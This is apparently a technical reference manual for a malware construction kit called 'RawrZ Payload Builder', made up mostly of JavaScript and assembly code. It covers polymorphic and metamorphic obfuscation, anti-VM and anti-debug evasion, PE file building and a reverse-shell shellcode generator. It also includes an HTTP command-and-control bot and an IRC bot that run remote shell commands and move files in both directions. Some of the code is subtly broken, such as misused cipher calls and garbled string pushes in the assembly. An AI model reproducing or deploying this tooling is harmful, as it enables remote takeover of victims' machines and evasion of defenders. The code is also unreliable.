# RawrZ Payload Builder - Technical Reference Manual 🛠️

## Architecture Overview

### Core Components
```
RawrZ Payload Builder/
├── main.js              # Electron main process
├── preload.js           # Secure context bridge
├── src/
│   ├── index.html       # Main UI
│   ├── renderer.js      # UI logic
│   ├── styles.css       # Styling
│   └── engines/         # Core engines
```

### Engine Architecture
```javascript
// Engine Interface
class BaseEngine {
    constructor(config) { this.config = config; }
    async initialize() { /* Setup */ }
    async execute(params) { /* Main logic */ }
    async cleanup() { /* Cleanup */ }
}
```

## Encryption Engines

### Crypto Engine (crypto-engine.js)
```javascript
const CryptoEngine = {
    // AES-256-GCM Implementation
    encryptAES256GCM: async (data, password) => {
        const key = await deriveKey(password);
        const iv = crypto.randomBytes(12);
        const cipher = crypto.createCipher('aes-256-gcm', key);
        cipher.setAAD(Buffer.from('RawrZ-Auth'));
        
        let encrypted = cipher.update(data);
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        const tag = cipher.getAuthTag();
        
        return { encrypted, iv, tag };
    },
    
    // ChaCha20-Poly1305 Implementation
    encryptChaCha20: async (data, key) => {
        const nonce = crypto.randomBytes(12);
        const cipher = crypto.createCipher('chacha20-poly1305', key);
        cipher.setAAD(Buffer.from('RawrZ-ChaCha'));
        
        let encrypted = cipher.update(data);
        encrypted = Buffer.concat([encrypted, cipher.final()]);
        const tag = cipher.getAuthTag();
        
        return { encrypted, nonce, tag };
    }
};
```

### Key Derivation Functions
```javascript
const KeyDerivation = {
    // PBKDF2 Implementation
    pbkdf2: async (password, salt, iterations = 100000) => {
        return crypto.pbkdf2Sync(password, salt, iterations, 32, 'sha256');
    },
    
    // Argon2 Implementation (requires argon2 package)
    argon2: async (password, salt) => {
        const argon2 = require('argon2');
        return await argon2.hash(password, {
            type: argon2.argon2id,
            memoryCost: 2 ** 16,
            timeCost: 3,
            parallelism: 1,
            salt: salt
        });
    },
    
    // Scrypt Implementation
    scrypt: async (password, salt, N = 16384) => {
        return crypto.scryptSync(password, salt, 32, { N, r: 8, p: 1 });
    }
};
```

## Polymorphic Engine

### Code Mutation Algorithms
```javascript
class PolymorphicEngine {
    constructor() {
        this.mutationTypes = [
            'registerSwap',
            'instructionReorder',
            'nopInsertion',
            'junkCodeInsertion',
            'equivalentInstruction'
        ];
    }
    
    // Register Swapping
    registerSwap(assembly) {
        const registers = ['eax', 'ebx', 'ecx', 'edx'];
        const mapping = this.generateRegisterMapping(registers);
        return assembly.replace(/\b(eax|ebx|ecx|edx)\b/g, 
            match => mapping[match]);
    }
    
    // Instruction Reordering
    instructionReorder(instructions) {
        const reorderable = this.findReorderableInstructions(instructions);
        return this.shuffleInstructions(reorderable);
    }
    
    // NOP Insertion
    nopInsertion(assembly) {
        const nopVariants = [
            'nop',
            'xchg eax, eax',
            'mov eax, eax',
            'lea eax, [eax+0]'
        ];
        
        return assembly.split('\n').map(line => {
            if (Math.random() < 0.3) {
                const nop = nopVariants[Math.floor(Math.random() * nopVariants.length)];
                return line + '\n' + nop;
            }
            return line;
        }).join('\n');
    }
}
```

### Metamorphic Transformations
```javascript
class MetamorphicEngine extends PolymorphicEngine {
    // Control Flow Obfuscation
    obfuscateControlFlow(code) {
        return this.insertFakeJumps(
            this.addDeadCode(
                this.flattenControlFlow(code)
            )
        );
    }
    
    // String Obfuscation
    obfuscateStrings(code) {
        const strings = this.extractStrings(code);
        const obfuscated = strings.map(str => ({
            original: str,
            encrypted: this.encryptString(str),
            key: this.generateKey()
        }));
        
        return this.replaceStrings(code, obfuscated);
    }
    
    // API Obfuscation
    obfuscateAPIs(code) {
        const apis = this.extractAPICalls(code);
        return apis.reduce((code, api) => {
            return this.replaceAPICall(code, api, this.generateDynamicCall(api));
        }, code);
    }
}
```

## Anti-Analysis Engines

### Anti-VM Detection
```javascript
const AntiVM = {
    // Registry-based detection
    checkVMRegistry: () => {
        const vmKeys = [
            'HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools',
            'HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions',
            'HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService'
        ];
        
        return vmKeys.some(key => this.registryKeyExists(key));
    },
    
    // Process-based detection
    checkVMProcesses: () => {
        const vmProcesses = [
            'vmtoolsd.exe',
            'vboxservice.exe',
            'vboxtray.exe',
            'vmwaretray.exe',
            'vmwareuser.exe'
        ];
        
        const processes = this.getRunningProcesses();
        return vmProcesses.some(proc => processes.includes(proc));
    },
    
    // Hardware-based detection
    checkVMHardware: () => {
        const checks = [
            this.checkCPUCount(),
            this.checkRAMSize(),
            this.checkDiskSize(),
            this.checkMACAddress(),
            this.checkSystemUUID()
        ];
        
        return checks.filter(Boolean).length >= 3;
    }
};
```

### Anti-Debug Techniques
```javascript
const AntiDebug = {
    // PEB-based detection
    checkPEBDebugFlag: () => {
        // Assembly: mov eax, fs:[30h]; mov al, [eax+2]; test al, al
        return this.executeAssembly(`
            mov eax, fs:[0x30]
            mov al, [eax+0x02]
            test al, al
            setnz al
        `);
    },
    
    // Timing-based detection
    timingCheck: () => {
        const start = performance.now();
        // Dummy operations
        for (let i = 0; i < 1000; i++) {
            Math.random();
        }
        const end = performance.now();
        
        // If execution took too long, likely being debugged
        return (end - start) > 100;
    },
    
    // Exception-based detection
    exceptionCheck: () => {
        try {
            // Trigger exception that debuggers handle differently
            this.triggerSEH();
            return false;
        } catch (e) {
            return this.analyzeException(e);
        }
    }
};
```

## Payload Generation

### PE File Structure
```javascript
class PEBuilder {
    constructor() {
        this.dosHeader = this.createDOSHeader();
        this.ntHeaders = this.createNTHeaders();
        this.sections = [];
    }
    
    createDOSHeader() {
        return {
            e_magic: 0x5A4D,    // "MZ"
            e_cblp: 0x90,
            e_cp: 0x03,
            e_crlc: 0x00,
            e_cparhdr: 0x04,
            e_minalloc: 0x00,
            e_maxalloc: 0xFFFF,
            e_ss: 0x00,
            e_sp: 0xB8,
            e_csum: 0x00,
            e_ip: 0x00,
            e_cs: 0x00,
            e_lfarlc: 0x40,
            e_ovno: 0x00,
            e_lfanew: 0x80
        };
    }
    
    addSection(name, data, characteristics) {
        const section = {
            name: name.padEnd(8, '\0'),
            virtualSize: data.length,
            virtualAddress: this.calculateVirtualAddress(),
            sizeOfRawData: this.alignToFileAlignment(data.length),
            pointerToRawData: this.calculateRawDataPointer(),
            characteristics: characteristics,
            data: data
        };
        
        this.sections.push(section);
        return section;
    }
    
    build() {
        const buffer = Buffer.alloc(this.calculateTotalSize());
        let offset = 0;
        
        // Write DOS header
        offset += this.writeDOSHeader(buffer, offset);
        
        // Write NT headers
        offset += this.writeNTHeaders(buffer, offset);
        
        // Write section headers
        offset += this.writeSectionHeaders(buffer, offset);
        
        // Write section data
        this.writeSectionData(buffer, offset);
        
        return buffer;
    }
}
```

### Shellcode Generation
```javascript
class ShellcodeGenerator {
    // Windows MessageBox shellcode
    generateMessageBox(title, message) {
        const shellcode = `
            ; Get kernel32.dll base address
            xor ecx, ecx
            mov eax, fs:[ecx + 0x30]
            mov eax, [eax + 0x0c]
            mov eax, [eax + 0x14]
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]
            
            ; Find GetProcAddress
            mov ebx, eax
            mov eax, [eax + 0x3c]
            add eax, ebx
            mov eax, [eax + 0x78]
            add eax, ebx
            mov ecx, [eax + 0x24]
            add ecx, ebx
            
            ; Load user32.dll and call MessageBoxA
            push 0x41636e75    ; "uncA"
            push 0x6c6c642e    ; ".dll"
            push 0x32337265    ; "er32"
            push 0x73755c5c    ; "\\\\us"
            mov eax, esp
            push eax
            call LoadLibraryA
            
            ; Call MessageBoxA
            push 0x00          ; MB_OK
            push ${this.stringToHex(title)}
            push ${this.stringToHex(message)}
            push 0x00          ; hWnd
            call MessageBoxA
        `;
        
        return this.assembleShellcode(shellcode);
    }
    
    // Reverse shell shellcode
    generateReverseShell(ip, port) {
        return this.assembleShellcode(`
            ; WSAStartup
            xor eax, eax
            mov ax, 0x0190
            sub esp, eax
            push esp
            push eax
            call WSAStartup
            
            ; WSASocket
            xor eax, eax
            push eax
            push eax
            push eax
            push eax
            inc eax
            push eax
            inc eax
            push eax
            call WSASocketA
            mov esi, eax
            
            ; Connect
            push ${this.ipToHex(ip)}
            push word ${port}
            push word 0x02
            mov eax, esp
            push 0x10
            push eax
            push esi
            call connect
            
            ; Spawn shell
            push 0x646d6320    ; "cmd"
            mov eax, esp
            push eax
            call system
        `);
    }
}
```

## Network Engines

### HTTP Bot Implementation
```javascript
class HTTPBot {
    constructor(c2Server, interval = 5000) {
        this.c2Server = c2Server;
        this.interval = interval;
        this.botId = this.generateBotId();
        this.running = false;
    }
    
    async start() {
        this.running = true;
        await this.register();
        this.startBeacon();
    }
    
    async register() {
        const systemInfo = await this.gatherSystemInfo();
        const payload = {
            botId: this.botId,
            action: 'register',
            data: systemInfo
        };
        
        return this.sendRequest(payload);
    }
    
    async beacon() {
        const payload = {
            botId: this.botId,
            action: 'beacon',
            timestamp: Date.now()
        };
        
        const response = await this.sendRequest(payload);
        if (response && response.commands) {
            await this.executeCommands(response.commands);
        }
    }
    
    async executeCommands(commands) {
        for (const command of commands) {
            try {
                const result = await this.executeCommand(command);
                await this.sendResult(command.id, result);
            } catch (error) {
                await this.sendError(command.id, error.message);
            }
        }
    }
    
    async sendRequest(payload) {
        const encrypted = await this.encrypt(JSON.stringify(payload));
        const response = await fetch(this.c2Server, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/octet-stream',
                'User-Agent': this.getRandomUserAgent()
            },
            body: encrypted
        });
        
        if (response.ok) {
            const data = await response.arrayBuffer();
            return JSON.parse(await this.decrypt(data));
        }
        
        return null;
    }
}
```

### IRC Bot Implementation
```javascript
class IRCBot {
    constructor(server, port, channel, nick) {
        this.server = server;
        this.port = port;
        this.channel = channel;
        this.nick = nick;
        this.socket = null;
    }
    
    async connect() {
        this.socket = new net.Socket();
        
        return new Promise((resolve, reject) => {
            this.socket.connect(this.port, this.server, () => {
                this.send(`NICK ${this.nick}`);
                this.send(`USER ${this.nick} 0 * :RawrZ Bot`);
                resolve();
            });
            
            this.socket.on('data', (data) => {
                this.handleData(data.toString());
            });
            
            this.socket.on('error', reject);
        });
    }
    
    handleData(data) {
        const lines = data.split('\r\n');
        
        for (const line of lines) {
            if (line.startsWith('PING')) {
                this.send(`PONG ${line.split(' ')[1]}`);
            } else if (line.includes('001')) {
                this.send(`JOIN ${this.channel}`);
            } else if (line.includes('PRIVMSG')) {
                this.handlePrivMsg(line);
            }
        }
    }
    
    handlePrivMsg(line) {
        const match = line.match(/:(.+)!.+ PRIVMSG (.+) :(.+)/);
        if (match) {
            const [, sender, target, message] = match;
            
            if (message.startsWith('!')) {
                this.executeCommand(message.substring(1), target);
            }
        }
    }
    
    async executeCommand(command, target) {
        const [cmd, ...args] = command.split(' ');
        
        switch (cmd) {
            case 'sysinfo':
                const info = await this.gatherSystemInfo();
                this.sendMessage(target, JSON.stringify(info));
                break;
                
            case 'exec':
                const result = await this.executeShell(args.join(' '));
                this.sendMessage(target, result);
                break;
                
            case 'download':
                await this.downloadFile(args[0], target);
                break;
                
            case 'upload':
                await this.uploadFile(args[0], args[1], target);
                break;
        }
    }
}
```

## Performance Optimization

### Multi-threading Implementation
```javascript
class WorkerPool {
    constructor(workerScript, poolSize = 4) {
        this.workerScript = workerScript;
        this.poolSize = poolSize;
        this.workers = [];
        this.queue = [];
        this.activeJobs = new Map();
    }
    
    async initialize() {
        for (let i = 0; i < this.poolSize; i++) {
            const worker = new Worker(this.workerScript);
            worker.on('message', (result) => {
                this.handleWorkerResult(worker, result);
            });
            
            this.workers.push({
                worker,
                busy: false,
                id: i
            });
        }
    }
    
    async execute(task) {
        return new Promise((resolve, reject) => {
            const job = {
                task,
                resolve,
                reject,
                id: this.generateJobId()
            };
            
            const availableWorker = this.workers.find(w => !w.busy);
            
            if (availableWorker) {
                this.assignJob(availableWorker, job);
            } else {
                this.queue.push(job);
            }
        });
    }
    
    assignJob(workerInfo, job) {
        workerInfo.busy = true;
        this.activeJobs.set(workerInfo.id, job);
        workerInfo.worker.postMessage({
            jobId: job.id,
            task: job.task
        });
    }
    
    handleWorkerResult(worker, result) {
        const workerInfo = this.workers.find(w => w.worker === worker);
        const job = this.activeJobs.get(workerInfo.id);
        
        if (job) {
            if (result.error) {
                job.reject(new Error(result.error));
            } else {
                job.resolve(result.data);
            }
            
            this.activeJobs.delete(workerInfo.id);
            workerInfo.busy = false;
            
            // Process next job in queue
            if (this.queue.length > 0) {
                const nextJob = this.queue.shift();
                this.assignJob(workerInfo, nextJob);
            }
        }
    }
}
```

### Memory Management
```javascript
class MemoryManager {
    constructor() {
        this.allocatedBlocks = new Map();
        this.freeBlocks = new Set();
        this.totalAllocated = 0;
        this.maxMemory = 1024 * 1024 * 1024; // 1GB limit
    }
    
    allocate(size, type = 'buffer') {
        if (this.totalAllocated + size > this.maxMemory) {
            this.garbageCollect();
            
            if (this.totalAllocated + size > this.maxMemory) {
                throw new Error('Out of memory');
            }
        }
        
        let block;
        
        switch (type) {
            case 'buffer':
                block = Buffer.alloc(size);
                break;
            case 'secure':
                block = this.allocateSecure(size);
                break;
            case 'executable':
                block = this.allocateExecutable(size);
                break;
            default:
                block = Buffer.alloc(size);
        }
        
        const id = this.generateBlockId();
        this.allocatedBlocks.set(id, {
            block,
            size,
            type,
            timestamp: Date.now()
        });
        
        this.totalAllocated += size;
        return { id, block };
    }
    
    deallocate(id) {
        const blockInfo = this.allocatedBlocks.get(id);
        
        if (blockInfo) {
            if (blockInfo.type === 'secure') {
                this.secureWipe(blockInfo.block);
            }
            
            this.allocatedBlocks.delete(id);
            this.totalAllocated -= blockInfo.size;
            this.freeBlocks.add(blockInfo.block);
        }
    }
    
    secureWipe(buffer) {
        // DoD 5220.22-M standard: 3-pass wipe
        const passes = [0x00, 0xFF, 0x00];
        
        for (const pattern of passes) {
            buffer.fill(pattern);
        }
        
        // Final pass with random data
        crypto.randomFillSync(buffer);
    }
    
    garbageCollect() {
        const now = Date.now();
        const maxAge = 5 * 60 * 1000; // 5 minutes
        
        for (const [id, blockInfo] of this.allocatedBlocks) {
            if (now - blockInfo.timestamp > maxAge) {
                this.deallocate(id);
            }
        }
        
        // Force V8 garbage collection
        if (global.gc) {
            global.gc();
        }
    }
}
```

## API Reference

### Core APIs
```javascript
// Encryption API
const encryption = {
    encrypt: async (data, algorithm, key) => { /* Implementation */ },
    decrypt: async (data, algorithm, key) => { /* Implementation */ },
    generateKey: (algorithm, size) => { /* Implementation */ },
    deriveKey: async (password, salt, iterations) => { /* Implementation */ }
};

// Payload API
const payload = {
    generate: async (type, options) => { /* Implementation */ },
    obfuscate: async (payload, level) => { /* Implementation */ },
    pack: async (payload, packer) => { /* Implementation */ },
    sign: async (payload, certificate) => { /* Implementation */ }
};

// Network API
const network = {
    scan: async (target, ports) => { /* Implementation */ },
    exploit: async (target, exploit) => { /* Implementation */ },
    tunnel: async (local, remote) => { /* Implementation */ },
    proxy: async (config) => { /* Implementation */ }
};
```

### Event System
```javascript
class EventManager {
    constructor() {
        this.listeners = new Map();
    }
    
    on(event, callback) {
        if (!this.listeners.has(event)) {
            this.listeners.set(event, new Set());
        }
        this.listeners.get(event).add(callback);
    }
    
    emit(event, data) {
        const callbacks = this.listeners.get(event);
        if (callbacks) {
            callbacks.forEach(callback => {
                try {
                    callback(data);
                } catch (error) {
                    console.error(`Event handler error for ${event}:`, error);
                }
            });
        }
    }
    
    off(event, callback) {
        const callbacks = this.listeners.get(event);
        if (callbacks) {
            callbacks.delete(callback);
        }
    }
}
```

## Configuration Schema

### Engine Configuration
```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "type": "object",
  "properties": {
    "encryption": {
      "type": "object",
      "properties": {
        "algorithm": {
          "type": "string",
          "enum": ["aes-256-gcm", "chacha20-poly1305", "aes-256-cbc"]
        },
        "keyDerivation": {
          "type": "string",
          "enum": ["pbkdf2", "scrypt", "argon2", "bcrypt"]
        },
        "iterations": {
          "type": "integer",
          "minimum": 1000,
          "default": 100000
        }
      },
      "required": ["algorithm", "keyDerivation"]
    },
    "evasion": {
      "type": "object",
      "properties": {
        "antiVM": { "type": "boolean", "default": true },
        "antiDebug": { "type": "boolean", "default": true },
        "polymorphic": { "type": "boolean", "default": true },
        "obfuscationLevel": {
          "type": "string",
          "enum": ["low", "medium", "high", "extreme"],
          "default": "high"
        }
      }
    },
    "payload": {
      "type": "object",
      "properties": {
        "type": {
          "type": "string",
          "enum": ["exe", "dll", "shellcode", "script"]
        },
        "architecture": {
          "type": "string",
          "enum": ["x86", "x64", "arm", "arm64"]
        },
        "compression": { "type": "boolean", "default": true },
        "signing": {
          "type": "object",
          "properties": {
            "enabled": { "type": "boolean", "default": false },
            "certificate": { "type": "string" },
            "timestamp": { "type": "boolean", "default": true }
          }
        }
      },
      "required": ["type", "architecture"]
    }
  },
  "required": ["encryption", "evasion", "payload"]
}
```

This technical reference provides deep implementation details for developers and advanced users working with the RawrZ Payload Builder codebase.